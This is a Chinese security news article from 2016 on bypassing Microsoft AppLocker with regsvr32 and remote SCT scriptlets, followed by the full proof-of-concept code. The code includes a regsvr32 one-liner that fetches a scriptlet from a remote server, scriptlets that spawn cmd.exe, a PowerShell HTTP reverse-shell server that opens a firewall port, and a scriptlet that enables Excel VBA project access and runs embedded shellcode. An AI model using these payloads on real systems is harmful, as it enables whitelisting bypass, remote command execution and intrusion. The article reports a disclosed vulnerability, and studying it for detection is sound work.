# 利用regsvr32可以绕过MS Applocker保护机制运行代码

阅读量 **163815**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-04-26 17:06:32

 **x**

##### 译文声明

本文是翻译文章，文章来源：360安全播报

原文地址：<http://securityaffairs.co/wordpress/46600/breaking-news/applocker-circumvented.html>

译文仅供参考，具体内容表达以及含义原文为准。

最近,安全研究人员发现了一个可能让Windows大乱的漏洞,利用该漏洞可以绕过白名单保护,例如微软的AppLocker。

微软的数字签名二进制文件是一个称为Regsvr32的实用程序,这是一个本机命令行实用程序,一般被用来注册动态链接库(DII)。在Windows系统上安装应用程序或是软件时该文件会被自动生成。

一旦已经注册了DII,其中包含的数据和代码就可以同时被多个应用程序共享。然而,安全研究人员提出的概念证明证实了对DII的调用结合了COM。

Scripplets(也被称为SCT文件,详情可参见COM+)并不局限于本地访问。事实上,研究人员可以从位于互联网任意地址的远程DLL执行它的源JavaScript或是VBScript代码。尽管利用此漏洞只能获得很小的特权,但是这足以让恶意活动变得轻而易举。

只要进入内部网络,攻击者就可以运行存在于互联网任意地址的恶意代码。此外,这种Regsvr32命令行实用程序是一种代理程序,并且遵循SSL协议。正因如此这种完善又易于操作的工具才会被滥用。

安全研究员“sub
Tee”说:“我一直在研究无文件持久机制,但是现在研究进入了瓶颈期,我也没有寄希望于任何人或是COM+。我发现有一处引用指出注册元素中的【COM+】代码用于注册和注销。虽然很感兴趣,但是由于研究工作遇到的困境,我没有办法注册DLL,使用管理员特权来执行代码。”因此“sub
Tee“决定采取不同的办法,”我以普通用户的身份登录并且右击.sct file,然后选择注销。我成功了!“

这是一个执行调用的示例:

    
    
    regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll  
    

因为在微软MSDN页面上对于Regsve32命令行实用程序的信息很有限,所以我们还不清楚这个漏洞到底是最初的设计问题还是出现了新缺陷。然而不论是何种原因,很显然,它会被用作开发工具。

从事件响应和计算机取证方面来看,除非分析师非常清楚如何寻找,否则很难真正检测到这类攻击。

截至目前为止,微软还没有对此发表任何评论,也不清楚微软是否会发布相关的修补程序。不过sub Tee已经在2016年4月19日向微软私下透露了此次漏洞。

相关的概念证明代码可以在[GitHub](https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302)里找到。

Backdoor-Minimalist.sct

<?XML version="1.0"?>

<scriptlet>

<registration

progid="Empire"

classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

<!– Proof Of Concept – Casey Smith @subTee –>

<script language="JScript">

<![CDATA[

var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");

]]>

</script>

</registration>

</scriptlet>

Backdoor-Minimalist.sct

<?XML version="1.0"?>

<scriptlet>

<registration

progid="Empire"

classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

<!– Proof Of Concept – Casey Smith @subTee –>

<script language="JScript">

<![CDATA[

var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");

]]>

</script>

</registration>

</scriptlet>

Backdoor.sct

<?XML version="1.0"?>

<scriptlet>

<registration

description="Bandit"

progid="Bandit"

version="1.00"

classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"

>

<!– regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll

<!– DFIR –>

<!–.sct files are downloaded and executed from a path like this –>

<!– Though, the name and extension are arbitary.. –>

<!– c:usersUSERappdatalocalmicrosoftwindowstemporary internet
filescontent.ie52vcqsj3kfile[2].sct –>

<!– Based on current research, no registry keys are written, since call
"uninstall" –>

<!– Proof Of Concept – Casey Smith @subTee –>

<script language="JScript">

<![CDATA[

var r = new ActiveXObject("WScript.Shell").Run("calc.exe");

]]>

</script>

</registration>

<public>

<method name="Exec"></method>

</public>

<script language="JScript">

<![CDATA[

function Exec()

{

var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");

}

]]>

</script>

</scriptlet>

Bandit.ps1

<#

Bandit

Author: Casey Smith @subTee

License: BSD3-Clause

.SYNOPSIS

Simple Reverse Shell over HTTP. Execute Commands on Client.

"regsvr32 /u /n /s /i:http://127.0.0.1/file.sct scrobj.dll"

Listening Server IP Address

For Python Version See https://github.com/Hood3dRob1n/JSRat-Py/blob/master/JSRat.py

#>

$Server = '127.0.0.1' #Listening IP. Change This.

function Receive-Request {

param(

$Request

)

$output = ""

$size = $Request.ContentLength64 + 1

$buffer = New-Object byte[] $size

do {

$count = $Request.InputStream.Read($buffer, 0, $size)

$output += $Request.ContentEncoding.GetString($buffer, 0, $count)

} until($count -lt $size)

$Request.InputStream.Close()

write-host $output

}

$listener = New-Object System.Net.HttpListener

$listener.Prefixes.Add('http://+:80/')

netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null

netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow
protocol=TCP localport=80 | Out-Null

$listener.Start()

'Listening …'

while ($true) {

$context = $listener.GetContext() # blocks until request is received

$request = $context.Request

$response = $context.Response

$hostip = $request.RemoteEndPoint

#Use this for One-Liner Start

if ($request.Url -match '/file.sct$' -and ($request.HttpMethod -eq "GET")) {

$message = '<?XML version="1.0"?>

<scriptlet>

<registration

description="Bandit"

progid="Bandit"

version="1.00"

classid="{90001111-0000-0000-0000-0000FEEDACDC}"

>

<script language="JScript">

<![CDATA[

while(true)

{

try

{

//Expects to run behind a proxy… Deal with it.

//Uncomment.

w = new ActiveXObject("WScript.Shell");

//v = w.RegRead("HKCU\Software\Microsoft\Windows\CurrentVersion\Internet
Settings\ProxyServer");

//q = v.split("=")[1].split(";")[0];

h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

//h.SetProxy(2,q);

h.Open("GET","http://'+$Server+'/rat",false);

h.Send();

c = h.ResponseText;

r = new ActiveXObject("WScript.Shell").Exec(c);

var so;

while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}

p = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

//p.SetProxy(2,q);

p.Open("POST","http://'+$Server+'/rat",false);

p.Send(so);

}

catch(err)

{

continue;

}

}

]]>

</script>

</registration>

</scriptlet>

'

}

if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "POST") ) {

Receive-Request($request)

}

if ($request.Url -match '/rat$' -and ($request.HttpMethod -eq "GET")) {

$response.ContentType = 'text/plain'

$message = Read-Host "JS $hostip>"

}

[byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)

$response.ContentLength64 = $buffer.length

$output = $response.OutputStream

$output.Write($buffer, 0, $buffer.length)

$output.Close()

}

$listener.Stop()

calc.sct

<?XML version="1.0"?>

<scriptlet>

<registration

progid="CalcShellcode"

classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

<!– Proof Of Concept – Casey Smith @subTee –>

<!– Orginal Shellcode Example : https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/ –>

<script language="JScript">

<![CDATA[

var objExcel = new ActiveXObject("Excel.Application");

objExcel.Visible = false;

var WshShell = new ActiveXObject("WScript.Shell");

var Application_Version = objExcel.Version;//Auto-Detect Version

var strRegPath = "HKEY_CURRENT_USER\Software\Microsoft\Office\" +
Application_Version + "\Excel\Security\AccessVBOM";

WshShell.RegWrite(strRegPath, 1, "REG_DWORD");

var objWorkbook = objExcel.Workbooks.Add();

var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);

strCode = '#If Vba7 Thenn'

strCode += 'Private Declare PtrSafe Function CreateThread Lib "kernel32"
(ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As
Long, ByVal Zukax As Long, Rlere As Long) As LongPtrn'

strCode += 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32"
(ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso
As Long) As LongPtrn'

strCode += 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32"
(ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As
LongPtrn'

strCode += '#Elsen'

strCode += 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv
As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax
As Long, Rlere As Long) As Longn'

strCode += 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As
Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As
Longn'

strCode += 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal
Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Longn'

strCode += '#EndIfn'

strCode += 'n'

strCode += 'Sub ExecShell()n'

strCode += ' Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long,
Zolde As Longn'

strCode += '#If Vba7 Thenn'

strCode += ' Dim Xlbufvetp As LongPtrn'

strCode += '#Elsen'

strCode += ' Dim Xlbufvetp As Longn'

strCode += '#EndIfn'

strCode += ' Hyeyhafxp =
Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _n'

strCode +=
'139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _n'

strCode +=
'13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _n'

strCode += '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1,
_n'

strCode +=
'214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _n'

strCode += '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,
_n'

strCode += '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18,
_n'

strCode +=
'235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _n'

strCode +=
'224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _n'

strCode += '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)n'

strCode += ' Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)n'

strCode += ' For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)n'

strCode += ' Wyzayxya = Hyeyhafxp(Zolde)n'

strCode += ' Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)n'

strCode += ' Next Zolden'

strCode += ' Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)n'

strCode += 'End Subn'

xlmodule.CodeModule.AddFromString(strCode);

objExcel.Run("ExecShell");

objExcel.DisplayAlerts = false;

objWorkbook.Close(false);

]]>

</script>

</registration>

</scriptlet>

本文翻译自360安全播报 [原文链接](http://securityaffairs.co/wordpress/46600/breaking-news/applocker-circumvented.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **默白** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/83825](/post/id/83825)

安全客 - 有思想的安全新媒体

本文转载自: [360安全播报](http://securityaffairs.co/wordpress/46600/breaking-news/applocker-circumvented.html)

如若转载,请注明出处： <http://securityaffairs.co/wordpress/46600/breaking-news/applocker-circumvented.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhmsg.com/dm/200_200_100/t011edf3404f95091e3.jpg) 默白

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

